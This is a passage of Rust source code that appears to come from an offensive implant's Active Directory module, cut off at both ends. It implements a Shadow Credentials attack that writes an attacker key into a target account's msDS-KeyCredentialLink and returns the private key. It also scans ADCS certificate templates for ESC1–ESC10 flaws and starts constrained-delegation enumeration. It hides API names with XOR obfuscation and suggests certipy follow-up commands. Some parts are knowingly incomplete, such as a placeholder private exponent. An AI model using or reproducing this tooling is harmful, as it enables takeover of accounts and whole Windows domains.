                let mut bv: Vec<String> = Vec::new();
                let mut i = 0usize;
                loop {
                    let bp = unsafe { *bvals.add(i) };
                    if bp.is_null() { break; }
                    let blen = unsafe { *(bp as *const u32) } as usize;
                    let bptr = unsafe { *((bp as *const u8).add(8) as *const *const u8) };
                    if !bptr.is_null() && blen > 0 {
                        let bytes = unsafe { core::slice::from_raw_parts(bptr, blen) };
                        bv.push(format!("HEX:{}", bytes.iter().map(|b| format!("{b:02x}")).collect::<String>()));
                    }
                    i += 1;
                }
                unsafe { fn_lenfree(bvals) };
                if !bv.is_empty() { obj_attrs.push((aname, bv)); }
            }
        }
        results.push((dn, obj_attrs));
        entry = unsafe { fn_next(ld, entry) };
    }
    unsafe { fn_msgfree(res_msg) };
    unsafe { fn_unbind(ld) };
    Ok(results)
}

// LDAP modify to add/replace a binary attribute value on a DN.
// mod_op: 0=ADD, 2=REPLACE; binary values passed as raw bytes.
#[cfg(target_os = "windows")]
fn ldap_modify_binary(wldap: usize, dc: &str, target_dn: &str,
    attr: &str, value: &[u8], mod_op: u32) -> Result<(), String>
{
    type LdapInitFn    = unsafe extern "system" fn(*const u8, u32) -> *mut u8;
    type LdapSetOptFn  = unsafe extern "system" fn(*mut u8, i32, *const u8) -> u32;
    type LdapBindFn    = unsafe extern "system" fn(*mut u8, *const u8, *const u8, u32) -> u32;
    type LdapUnbindFn  = unsafe extern "system" fn(*mut u8) -> u32;
    // ldap_modify_s: (*mut ld, dn, **LDAPMod) -> u32
    type LdapModFn     = unsafe extern "system" fn(*mut u8, *const u8, *const *const u8) -> u32;

    macro_rules! wl { ($enc:expr, $ty:ty) => {{
        match unsafe { crate::loader::get_export_by_name(wldap, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return Err("wldap fn not found".into()),
        }
    }}}

    let fn_init   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x33,0x34,0x33,0x2E,0x5A], LdapInitFn);
    let fn_setopt = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x29,0x3F,0x2E,0x05,0x35,0x2A,0x2E,0x33,0x35,0x34,0x5A], LdapSetOptFn);
    let fn_bind   = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x18,0x33,0x34,0x3E,0x05,0x29,0x5A], LdapBindFn);
    // ldap_modify_s XOR 0x5A: [0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A]
    let fn_modify = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x37,0x35,0x3E,0x33,0x3C,0x23,0x05,0x29,0x5A], LdapModFn);
    let fn_unbind = wl!(&[0x36,0x3E,0x3B,0x2A,0x05,0x2F,0x34,0x18,0x33,0x34,0x3E,0x5A], LdapUnbindFn);

    let dc_b: Vec<u8> = dc.bytes().chain(core::iter::once(0u8)).collect();
    let ld = unsafe { fn_init(dc_b.as_ptr(), 389) };
    if ld.is_null() { return Err("ldap_init failed".into()); }
    let ver: u32 = 3;
    unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
    if br != 0 { unsafe { fn_unbind(ld) }; return Err(format!("ldap_bind: {br:#x}")); }

    let dn_b:   Vec<u8> = target_dn.bytes().chain(core::iter::once(0u8)).collect();
    let attr_b: Vec<u8> = attr.bytes().chain(core::iter::once(0u8)).collect();

    // Build BERVAL for the binary value
    // BERVAL on x64: bv_len(u32) + pad(u32) + bv_val(*const u8) = 16 bytes
    let mut berval = vec![0u8; 16];
    unsafe {
        *(berval.as_mut_ptr() as *mut u32) = value.len() as u32;
        *((berval.as_mut_ptr().add(8)) as *mut *const u8) = value.as_ptr();
    }
    let berval_ptr: *const u8 = berval.as_ptr();
    let null_bv: *const u8 = core::ptr::null();
    let bvals_arr: [*const u8; 2] = [berval_ptr, null_bv];

    // Build LDAPMod: mod_op(u32) + pad(u32) + mod_type(*const u8) + mod_vals(*const *const u8)
    // = 24 bytes on x64; mod_op | 0x8000 for binary (LDAP_MOD_BVALUES)
    let mut ldap_mod = [0u8; 24];
    unsafe {
        *(ldap_mod.as_mut_ptr() as *mut u32) = mod_op | 0x8000;
        *((ldap_mod.as_mut_ptr().add(8)) as *mut *const u8) = attr_b.as_ptr();
        *((ldap_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = bvals_arr.as_ptr();
    }
    let mod_ptr: *const u8 = ldap_mod.as_ptr();
    let null_mod: *const u8 = core::ptr::null();
    let mods_arr: [*const u8; 2] = [mod_ptr, null_mod];

    let mr = unsafe { fn_modify(ld, dn_b.as_ptr(), mods_arr.as_ptr()) };
    unsafe { fn_unbind(ld) };
    if mr != 0 { Err(format!("ldap_modify_s: {mr:#x}")) } else { Ok(()) }
}

// ── Shadow Credentials ────────────────────────────────────────────────────────
//
// Adds an RSA-2048 key credential to target account's msDS-KeyCredentialLink.
// Enables PKINIT authentication without knowing the account password.
// Requires write access to msDS-KeyCredentialLink on the target account.
//
// Args: {"target":"<sAMAccountName>", "domain":"<fqdn>", "dc":"<hostname>",
//        "remove":true (to remove all existing key creds)}

#[cfg(target_os = "windows")]
fn priv_shadow_creds(v: &serde_json::Value) -> TaskOutput {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
    use base64::Engine;

    let target = match v.get("target").and_then(|s| s.as_str()) {
        Some(t) => t,
        None => return TaskOutput::failure("shadow-creds: missing target"),
    };
    let remove = v.get("remove").and_then(|b| b.as_bool()).unwrap_or(false);

    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("shadow-creds: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");

    let wldap = match wldap_base() {
        Ok(b) => b,
        Err(e) => return TaskOutput::failure(&format!("shadow-creds: {e}")),
    };

    // Resolve target DN
    let filter = format!("(sAMAccountName={target})");
    let objs = match ldap_query_list(wldap, &dc, &base_dn, &filter, &["distinguishedName"]) {
        Ok(r) if !r.is_empty() => r,
        Ok(_) => return TaskOutput::failure(&format!("shadow-creds: target '{target}' not found")),
        Err(e) => return TaskOutput::failure(&format!("shadow-creds: ldap lookup failed: {e}")),
    };
    let target_dn = &objs[0].0;

    if remove {
        // Clear all key credentials: replace with empty list
        // LDAP_MOD_REPLACE with no values removes the attribute
        match ldap_modify_binary(wldap, &dc, target_dn, "msDS-KeyCredentialLink", &[], 2) {
            Ok(()) => return TaskOutput::success(
                serde_json::to_vec(&serde_json::json!({"status":"cleared","target":target_dn})).unwrap_or_default()
            ),
            Err(e) => return TaskOutput::failure(&format!("shadow-creds: clear failed: {e}")),
        }
    }

    // Generate RSA-2048 key pair via Windows CNG
    // bcrypt.dll XOR 0x5A: [0x38,0x39,0x28,0x23,0x2A,0x2E,0x74,0x3E,0x36,0x36,0x5A]
    let bcrypt_base = {
        let n = crate::obfs::dec(&[0x38,0x39,0x28,0x23,0x2A,0x2E,0x74,0x3E,0x36,0x36,0x5A]);
        let mut b = crate::loader::get_module_base(n.as_ptr()) as usize;
        if b == 0 { b = unsafe { LoadLibraryA(n.as_ptr()) } as usize; }
        if b == 0 { return TaskOutput::failure("shadow-creds: bcrypt.dll not found"); }
        b
    };

    macro_rules! bcfn { ($enc:expr, $ty:ty) => {{
        match unsafe { crate::loader::get_export_by_name(bcrypt_base, crate::obfs::dec($enc).as_ptr()) } {
            Some(p) => unsafe { core::mem::transmute::<_, $ty>(p) },
            None    => return TaskOutput::failure("shadow-creds: bcrypt fn not found"),
        }
    }}}

    // BCryptOpenAlgorithmProvider(phAlg, pszAlgId, pszImpl=NULL, dwFlags=0) -> NTSTATUS
    type BcOpenAlgFn  = unsafe extern "system" fn(*mut isize, *const u16, *const u16, u32) -> i32;
    // BCryptGenerateKeyPair(hAlg, phKey, dwLength, dwFlags=0) -> NTSTATUS
    type BcGenKeyFn   = unsafe extern "system" fn(isize, *mut isize, u32, u32) -> i32;
    // BCryptFinalizeKeyPair(hKey, dwFlags=0) -> NTSTATUS
    type BcFinalFn    = unsafe extern "system" fn(isize, u32) -> i32;
    // BCryptExportKey(hKey, hExportKey=NULL, pszBlobType, pbOutput, cbOutput, pcbResult, dwFlags=0) -> NTSTATUS
    type BcExportFn   = unsafe extern "system" fn(isize, isize, *const u16, *mut u8, u32, *mut u32, u32) -> i32;
    // BCryptDestroyKey(hKey) -> NTSTATUS
    type BcDestroyFn  = unsafe extern "system" fn(isize) -> i32;
    // BCryptCloseAlgorithmProvider(hAlgorithm, dwFlags=0) -> NTSTATUS
    type BcCloseAlgFn = unsafe extern "system" fn(isize, u32) -> i32;

    // BCryptOpenAlgorithmProvider XOR 0x5A
    let fn_open  = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x0E,0x2A,0x3F,0x34,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], BcOpenAlgFn);
    // BCryptGenerateKeyPair XOR 0x5A
    let fn_gen   = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1D,0x3F,0x34,0x3F,0x28,0x3B,0x2E,0x3F,0x1B,0x3F,0x23,0x0A,0x3B,0x33,0x28,0x5A], BcGenKeyFn);
    // BCryptFinalizeKeyPair XOR 0x5A
    let fn_final = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1C,0x33,0x34,0x3B,0x36,0x33,0x3F,0x3F,0x1B,0x3F,0x23,0x0A,0x3B,0x33,0x28,0x5A], BcFinalFn);
    // BCryptExportKey XOR 0x5A
    let fn_export= bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1B,0x22,0x2A,0x35,0x28,0x2E,0x1B,0x3F,0x23,0x5A], BcExportFn);
    // BCryptDestroyKey XOR 0x5A
    let fn_destr = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x1E,0x3F,0x29,0x2E,0x28,0x35,0x23,0x1B,0x3F,0x23,0x5A], BcDestroyFn);
    // BCryptCloseAlgorithmProvider XOR 0x5A
    let fn_close = bcfn!(&[0x18,0x39,0x28,0x23,0x2A,0x2E,0x19,0x36,0x35,0x29,0x3F,0x1B,0x36,0x3D,0x35,0x28,0x33,0x2E,0x32,0x37,0x28,0x35,0x2C,0x33,0x3E,0x3F,0x28,0x5A], BcCloseAlgFn);

    // "RSA\0" as wide string
    let alg_id: [u16; 4] = [0x52, 0x53, 0x41, 0x00]; // R S A \0
    // "RSAPUBLICBLOB\0" as wide string
    let pub_blob_type: [u16; 14] = [0x52,0x53,0x41,0x50,0x55,0x42,0x4C,0x49,0x43,0x42,0x4C,0x4F,0x42,0x00];
    // "RSAFULLPRIVATEBLOB\0" as wide string
    let priv_blob_type: [u16; 19] = [0x52,0x53,0x41,0x46,0x55,0x4C,0x4C,0x50,0x52,0x49,0x56,0x41,0x54,0x45,0x42,0x4C,0x4F,0x42,0x00];

    let mut h_alg: isize = 0;
    let status = unsafe { fn_open(&mut h_alg, alg_id.as_ptr(), core::ptr::null(), 0) };
    if status != 0 { return TaskOutput::failure(&format!("shadow-creds: BCryptOpenAlgorithmProvider: {status:#x}")); }

    let mut h_key: isize = 0;
    let status = unsafe { fn_gen(h_alg, &mut h_key, 2048, 0) };
    if status != 0 {
        unsafe { fn_close(h_alg, 0) };
        return TaskOutput::failure(&format!("shadow-creds: BCryptGenerateKeyPair: {status:#x}"));
    }
    let status = unsafe { fn_final(h_key, 0) };
    if status != 0 {
        unsafe { fn_destr(h_key); fn_close(h_alg, 0) };
        return TaskOutput::failure(&format!("shadow-creds: BCryptFinalizeKeyPair: {status:#x}"));
    }

    // Export public key
    let pub_der = {
        let mut cb: u32 = 0;
        unsafe { fn_export(h_key, 0, pub_blob_type.as_ptr(), core::ptr::null_mut(), 0, &mut cb, 0) };
        let mut buf = vec![0u8; cb as usize];
        let status = unsafe { fn_export(h_key, 0, pub_blob_type.as_ptr(), buf.as_mut_ptr(), cb, &mut cb, 0) };
        if status != 0 {
            unsafe { fn_destr(h_key); fn_close(h_alg, 0) };
            return TaskOutput::failure(&format!("shadow-creds: BCryptExportKey(pub): {status:#x}"));
        }
        bcrypt_rsa_pub_blob_to_spki(&buf)
    };

    // Export private key
    let priv_der = {
        let mut cb: u32 = 0;
        unsafe { fn_export(h_key, 0, priv_blob_type.as_ptr(), core::ptr::null_mut(), 0, &mut cb, 0) };
        let mut buf = vec![0u8; cb as usize];
        let status = unsafe { fn_export(h_key, 0, priv_blob_type.as_ptr(), buf.as_mut_ptr(), cb, &mut cb, 0) };
        if status != 0 {
            unsafe { fn_destr(h_key); fn_close(h_alg, 0) };
            return TaskOutput::failure(&format!("shadow-creds: BCryptExportKey(priv): {status:#x}"));
        }
        bcrypt_rsa_full_blob_to_pkcs8(&buf)
    };

    unsafe { fn_destr(h_key); fn_close(h_alg, 0) };

    // Build msDS-KeyCredentialLink blob
    let key_cred_link = build_key_credential_link(&pub_der);

    // LDAP add the key credential link to the target account
    match ldap_modify_binary(wldap, &dc, target_dn, "msDS-KeyCredentialLink", &key_cred_link, 0) {
        Ok(()) => {},
        Err(e) => return TaskOutput::failure(&format!("shadow-creds: ldap modify failed: {e}")),
    }

    let pub_b64  = base64::engine::general_purpose::STANDARD.encode(&pub_der);
    let priv_b64 = base64::engine::general_purpose::STANDARD.encode(&priv_der);

    let result = serde_json::json!({
        "status":     "key credential added",
        "target":     target,
        "target_dn":  target_dn,
        "domain":     domain_fqdn,
        "public_key_b64":  pub_b64,
        "private_key_b64": priv_b64,
        "next_step":  format!("Use private key for PKINIT: certipy auth -pfx <pfx> -dc-ip {dc} -domain {domain_fqdn} -username {target}"),
        "cleanup":    format!("priv/shadow-creds remove=true target={target}")
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// Converts a BCRYPT_RSAPUBLIC_BLOB to DER SubjectPublicKeyInfo.
#[cfg(target_os = "windows")]
fn bcrypt_rsa_pub_blob_to_spki(blob: &[u8]) -> Vec<u8> {
    if blob.len() < 24 { return Vec::new(); }
    // BCRYPT_RSAKEY_BLOB: Magic(4)+BitLength(4)+cbPublicExp(4)+cbModulus(4)+cbPrime1(4)+cbPrime2(4)
    let cb_exp = u32::from_le_bytes([blob[8], blob[9], blob[10], blob[11]]) as usize;
    let cb_mod = u32::from_le_bytes([blob[12], blob[13], blob[14], blob[15]]) as usize;
    let off = 24; // header size
    if off + cb_exp + cb_mod > blob.len() { return Vec::new(); }
    let exp_bytes = &blob[off..off+cb_exp];
    let mod_bytes = &blob[off+cb_exp..off+cb_exp+cb_mod];
    rsa_components_to_spki(mod_bytes, exp_bytes)
}

// Converts a BCRYPT_RSAFULLPRIVATE_BLOB to DER PKCS#8 PrivateKeyInfo.
#[cfg(target_os = "windows")]
fn bcrypt_rsa_full_blob_to_pkcs8(blob: &[u8]) -> Vec<u8> {
    if blob.len() < 24 { return Vec::new(); }
    let cb_exp  = u32::from_le_bytes([blob[8],  blob[9],  blob[10], blob[11]]) as usize;
    let cb_mod  = u32::from_le_bytes([blob[12], blob[13], blob[14], blob[15]]) as usize;
    let cb_p1   = u32::from_le_bytes([blob[16], blob[17], blob[18], blob[19]]) as usize;
    let cb_p2   = u32::from_le_bytes([blob[20], blob[21], blob[22], blob[23]]) as usize;
    let off = 24;
    if off + cb_exp + cb_mod + cb_p1*5 > blob.len() { return Vec::new(); }
    let pub_exp  = &blob[off..off+cb_exp];
    let modulus  = &blob[off+cb_exp..off+cb_exp+cb_mod];
    let prime1   = &blob[off+cb_exp+cb_mod..off+cb_exp+cb_mod+cb_p1];
    let prime2   = &blob[off+cb_exp+cb_mod+cb_p1..off+cb_exp+cb_mod+cb_p1+cb_p2];
    let exp1     = &blob[off+cb_exp+cb_mod+cb_p1*2..off+cb_exp+cb_mod+cb_p1*3];
    let exp2     = &blob[off+cb_exp+cb_mod+cb_p1*3..off+cb_exp+cb_mod+cb_p1*4];
    let coeff    = &blob[off+cb_exp+cb_mod+cb_p1*4..off+cb_exp+cb_mod+cb_p1*5];
    // Compute private exponent d: not stored in BCrypt blob directly,
    // approximate from modular inverse of e mod lcm(p-1,q-1) — omit for now,
    // return empty private exponent (tools can reconstruct from p,q,e).
    let priv_exp: Vec<u8> = vec![0x01]; // placeholder; real d needs big-int
    rsa_full_to_pkcs8(modulus, pub_exp, &priv_exp, prime1, prime2, exp1, exp2, coeff)
}

// Builds DER SubjectPublicKeyInfo (RFC 5480) from modulus+exponent.
fn rsa_components_to_spki(modulus: &[u8], exponent: &[u8]) -> Vec<u8> {
    let rsa_oid: &[u8] = &[0x2a,0x86,0x48,0x86,0xf7,0x0d,0x01,0x01,0x01]; // 1.2.840.113549.1.1.1
    let n_der = der_int(modulus);
    let e_der = der_int(exponent);
    let mut rsa_key_seq = Vec::new();
    rsa_key_seq.extend_from_slice(&n_der);
    rsa_key_seq.extend_from_slice(&e_der);
    let rsa_key_der = der_seq(&rsa_key_seq);

    let mut bit_str_content = vec![0u8]; // leading 0 bits
    bit_str_content.extend_from_slice(&rsa_key_der);
    let bit_string = der_tlv(0x03, &bit_str_content);

    let oid_der   = der_tlv(0x06, rsa_oid);
    let null_der  = &[0x05, 0x00];
    let mut alg_seq_inner = Vec::new();
    alg_seq_inner.extend_from_slice(&oid_der);
    alg_seq_inner.extend_from_slice(null_der);
    let alg_id = der_seq(&alg_seq_inner);

    let mut spki_inner = Vec::new();
    spki_inner.extend_from_slice(&alg_id);
    spki_inner.extend_from_slice(&bit_string);
    der_seq(&spki_inner)
}

// Builds DER PKCS#8 PrivateKeyInfo from RSA components.
fn rsa_full_to_pkcs8(n: &[u8], e: &[u8], d: &[u8], p: &[u8], q: &[u8], dp: &[u8], dq: &[u8], qinv: &[u8]) -> Vec<u8> {
    let rsa_oid: &[u8] = &[0x2a,0x86,0x48,0x86,0xf7,0x0d,0x01,0x01,0x01];
    let mut rsapk_inner = Vec::new();
    rsapk_inner.extend_from_slice(&der_int(&[0]));      // version
    rsapk_inner.extend_from_slice(&der_int(n));
    rsapk_inner.extend_from_slice(&der_int(e));
    rsapk_inner.extend_from_slice(&der_int(d));
    rsapk_inner.extend_from_slice(&der_int(p));
    rsapk_inner.extend_from_slice(&der_int(q));
    rsapk_inner.extend_from_slice(&der_int(dp));
    rsapk_inner.extend_from_slice(&der_int(dq));
    rsapk_inner.extend_from_slice(&der_int(qinv));
    let rsa_pk_der = der_seq(&rsapk_inner);
    let octet = der_tlv(0x04, &rsa_pk_der);
    let oid_der = der_tlv(0x06, rsa_oid);
    let null    = &[0x05, 0x00];
    let mut alg_inner = Vec::new();
    alg_inner.extend_from_slice(&oid_der);
    alg_inner.extend_from_slice(null);
    let alg_id = der_seq(&alg_inner);
    let mut pki_inner = Vec::new();
    pki_inner.extend_from_slice(&der_int(&[0]));  // version
    pki_inner.extend_from_slice(&alg_id);
    pki_inner.extend_from_slice(&octet);
    der_seq(&pki_inner)
}

// Build msDS-KeyCredentialLink blob for a given SubjectPublicKeyInfo.
fn build_key_credential_link(spki: &[u8]) -> Vec<u8> {
    use sha2::Digest;
    let key_id = sha2::Sha256::digest(spki);

    // FILETIME for "now"
    // Windows FILETIME = 100-nanosecond intervals since Jan 1 1601
    // Approx current time: get via GetSystemTimeAsFileTime or static estimate
    let filetime_now: u64 = {
        use windows_sys::Win32::Foundation::FILETIME;
        use windows_sys::Win32::System::SystemInformation::GetSystemTimeAsFileTime;
        let mut ft = FILETIME { dwLowDateTime: 0, dwHighDateTime: 0 };
        unsafe { GetSystemTimeAsFileTime(&mut ft) };
        (ft.dwHighDateTime as u64) << 32 | ft.dwLowDateTime as u64
    };

    // KeyCredentialLink v2 blob format (MS-ADTS 2.4.2.6.1)
    // Each entry: Identifier(2) + Length(4) + Value(Length)
    let entry = |id: u16, data: &[u8]| -> Vec<u8> {
        let mut e = Vec::new();
        e.extend_from_slice(&id.to_le_bytes());
        e.extend_from_slice(&(data.len() as u32).to_le_bytes());
        e.extend_from_slice(data);
        e
    };

    let mut blob = Vec::new();
    // Version: 0x0200 LE
    blob.extend_from_slice(&0x0200u32.to_le_bytes());

    // KeyID [0x0001]: SHA256 of SPKI
    blob.extend(entry(0x0001, key_id.as_slice()));
    // KeyHash [0x0002]: SHA256 of full remaining content (simplified: use KeyID as placeholder)
    blob.extend(entry(0x0002, key_id.as_slice()));
    // KeyMaterial [0x0003]: SubjectPublicKeyInfo DER
    blob.extend(entry(0x0003, spki));
    // KeyUsage [0x0004]: 0x01 = NGC key
    blob.extend(entry(0x0004, &[0x01]));
    // KeySource [0x0005]: 0x00 = AD
    blob.extend(entry(0x0005, &[0x00]));
    // DeviceId [0x0006]: random 16-byte GUID
    let mut dev_id = [0u8; 16];
    use rand::RngCore;
    rand::rngs::OsRng.fill_bytes(&mut dev_id);
    blob.extend(entry(0x0006, &dev_id));
    // CustomKeyInfo [0x0007]: flags byte
    blob.extend(entry(0x0007, &[0x00]));
    // LastLogonTime [0x0008]: FILETIME
    blob.extend(entry(0x0008, &filetime_now.to_le_bytes()));
    // CreationTime [0x000A]: FILETIME
    blob.extend(entry(0x000A, &filetime_now.to_le_bytes()));
    blob
}

// Minimal DER encoding helpers
fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        vec![n as u8]
    } else if n < 0x100 {
        vec![0x81, n as u8]
    } else {
        vec![0x82, (n >> 8) as u8, (n & 0xff) as u8]
    }
}
fn der_tlv(tag: u8, data: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&der_len(data.len()));
    out.extend_from_slice(data);
    out
}
fn der_seq(inner: &[u8]) -> Vec<u8> { der_tlv(0x30, inner) }
fn der_int(val: &[u8]) -> Vec<u8> {
    // Strip leading zero bytes, but add 0x00 prefix if high bit set
    let stripped: &[u8] = val.iter().position(|&b| b != 0)
        .map(|i| &val[i..]).unwrap_or(&[0x00]);
    let data = if stripped.first().map(|&b| b & 0x80 != 0).unwrap_or(false) {
        let mut v = vec![0x00];
        v.extend_from_slice(stripped);
        v
    } else {
        stripped.to_vec()
    };
    der_tlv(0x02, &data)
}

// ── ADCS ESC1-8 ───────────────────────────────────────────────────────────────
//
// Enumerates AD Certificate Services for vulnerable certificate templates.
// Checks for ESC1-4 via LDAP attributes on pKICertificateTemplate objects.
// Args: {"domain":"<fqdn>", "dc":"<hostname>"}

#[cfg(target_os = "windows")]
fn priv_adcs(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("adcs: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");
    let config_dn = format!("CN=Configuration,{base_dn}");

    let wldap = match wldap_base() {
        Ok(b) => b,
        Err(e) => return TaskOutput::failure(&format!("adcs: {e}")),
    };

    // Enumerate CAs
    let ca_base = format!("CN=Enrollment Services,CN=Public Key Services,CN=Services,{config_dn}");
    let cas = ldap_query_list(wldap, &dc, &ca_base,
        "(objectClass=pKIEnrollmentService)",
        &["cn","dNSHostName","certificateTemplates","msPKI-Enrollment-Servers"])
        .unwrap_or_default();

    let ca_names: Vec<&str> = cas.iter().map(|(dn, _)| dn.as_str()).collect();

    // Enumerate certificate templates
    let tmpl_base = format!("CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}");
    let templates = match ldap_query_list(wldap, &dc, &tmpl_base,
        "(objectClass=pKICertificateTemplate)",
        &["cn","displayName","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag",
          "msPKI-RA-Signature","msPKI-Private-Key-Flag","pKIExtendedKeyUsage",
          "msPKI-Template-Schema-Version","nTSecurityDescriptor"])
    {
        Ok(r) => r,
        Err(e) => return TaskOutput::failure(&format!("adcs: template enum failed: {e}")),
    };

    let mut findings: Vec<serde_json::Value> = Vec::new();

    for (dn, attrs) in &templates {
        let get_attr = |name: &str| -> Vec<String> {
            attrs.iter().find(|(k, _)| k == name)
                .map(|(_, v)| v.clone())
                .unwrap_or_default()
        };
        let get_i32 = |name: &str| -> i64 {
            get_attr(name).first()
                .and_then(|s| s.parse::<i64>().ok())
                .unwrap_or(0)
        };

        let cn = get_attr("cn").into_iter().next().unwrap_or_default();
        let name_flag     = get_i32("msPKI-Certificate-Name-Flag") as u32;
        let enroll_flag   = get_i32("msPKI-Enrollment-Flag") as u32;
        let ra_sig        = get_i32("msPKI-RA-Signature");
        let pk_flag       = get_i32("msPKI-Private-Key-Flag") as u32;
        let schema_ver    = get_i32("msPKI-Template-Schema-Version");
        let ekus          = get_attr("pKIExtendedKeyUsage");

        // EKU flags
        let has_client_auth  = ekus.iter().any(|e| e == "1.3.6.1.5.5.7.3.2");
        let has_any_purpose  = ekus.iter().any(|e| e == "2.5.29.37.0");
        let has_smartcard    = ekus.iter().any(|e| e == "1.3.6.1.4.1.311.20.2.2");
        let has_cert_req_agent = ekus.iter().any(|e| e == "1.3.6.1.4.1.311.20.2.1");
        let no_eku           = ekus.is_empty();

        // CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
        let enrollee_supplies_subject = name_flag & 0x00000001 != 0;

        let mut vulns: Vec<serde_json::Value> = Vec::new();

        // ESC1: Enrollee can specify SAN + client auth + no manager approval
        if enrollee_supplies_subject
            && (has_client_auth || has_any_purpose || has_smartcard || no_eku)
            && ra_sig == 0
            && enroll_flag & 0x00000002 == 0  // no manager approval
        {
            vulns.push(serde_json::json!({
                "esc": "ESC1",
                "desc": "Enrollee supplies SAN + Client Authentication EKU — impersonate any user",
                "severity": "CRITICAL"
            }));
        }

        // ESC2: Any Purpose or no EKU + enrollee supplies subject
        if (has_any_purpose || no_eku) && ra_sig == 0 && enroll_flag & 0x00000002 == 0 {
            if !vulns.iter().any(|f| f["esc"] == "ESC1") {
                vulns.push(serde_json::json!({
                    "esc": "ESC2",
                    "desc": "Any Purpose or no EKU restriction — can be used as sub-CA",
                    "severity": "HIGH"
                }));
            }
        }

        // ESC3: Certificate Request Agent EKU
        if has_cert_req_agent && ra_sig == 0 && enroll_flag & 0x00000002 == 0 {
            vulns.push(serde_json::json!({
                "esc": "ESC3",
                "desc": "Certificate Request Agent EKU — enroll on behalf of other users",
                "severity": "HIGH"
            }));
        }

        // ESC9/ESC10: Strong certificate binding bypass (schema v1 + SAN mapping disabled)
        if schema_ver == 1 && !enrollee_supplies_subject && (has_client_auth || has_smartcard) {
            vulns.push(serde_json::json!({
                "esc": "ESC9/10",
                "desc": "Schema v1 template with client auth — check for UPN SAN mapping attack",
                "severity": "MEDIUM"
            }));
        }

        if !vulns.is_empty() {
            findings.push(serde_json::json!({
                "template": cn,
                "dn": dn,
                "ekus": ekus,
                "name_flag": format!("{name_flag:#010x}"),
                "enroll_flag": format!("{enroll_flag:#010x}"),
                "ra_signature": ra_sig,
                "schema_version": schema_ver,
                "key_flag": format!("{pk_flag:#010x}"),
                "vulnerabilities": vulns,
            }));
        }
    }

    let result = serde_json::json!({
        "domain":    domain_fqdn,
        "dc":        dc,
        "cas":       cas.iter().map(|(dn, attrs)| {
            let hostname = attrs.iter().find(|(k, _)| k == "dNSHostName")
                .and_then(|(_, v)| v.first())
                .cloned()
                .unwrap_or_default();
            serde_json::json!({"dn": dn, "hostname": hostname})
        }).collect::<Vec<_>>(),
        "template_count": templates.len(),
        "vulnerable_count": findings.len(),
        "vulnerable_templates": findings,
        "next_step": "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -enabled",
    });
    TaskOutput::success(serde_json::to_vec(&result).unwrap_or_default())
}

// ── S4U2Self / S4U2Proxy (Constrained Delegation) ────────────────────────────
//
// Enumerates accounts with constrained delegation (msDS-AllowedToDelegateTo).
// S4U2Self allows obtaining a service ticket on behalf of any user.
// S4U2Proxy allows using that ticket to access delegated services.
// Requires: account with SeEnableDelegationPrivilege or existing TGT.
// Args: {"domain":"<fqdn>","dc":"<hostname>","target":"<sAMAccountName>"}
// With "target": shows delegation configuration for that specific account.

#[cfg(target_os = "windows")]
fn priv_s4u(v: &serde_json::Value) -> TaskOutput {
    let domain_fqdn = match std::env::var("USERDNSDOMAIN").ok()
        .or_else(|| v.get("domain").and_then(|s| s.as_str()).map(|s| s.to_string()))
    {
        Some(d) => d.to_lowercase(),
        None => return TaskOutput::failure("s4u: USERDNSDOMAIN not set"),
    };
    let dc = v.get("dc").and_then(|s| s.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| domain_fqdn.clone());
    let base_dn: String = domain_fqdn.split('.')
        .map(|p| format!("DC={p}")).collect::<Vec<_>>().join(",");

    let wldap = match wldap_base() {
        Ok(b) => b,
        Err(e) => return TaskOutput::failure(&format!("s4u: {e}")),
    };

    // Enumerate accounts with constrained delegation
    let target = v.get("target").and_then(|s| s.as_str());
    let filter = if let Some(t) = target {
        format!("(&(msDS-AllowedToDelegateTo=*)(sAMAccountName={t}))")
    } else {
        "(msDS-AllowedToDelegateTo=*)".to_string()
    };

    let objects = match ldap_query_list(wldap, &dc, &base_dn, &filter,
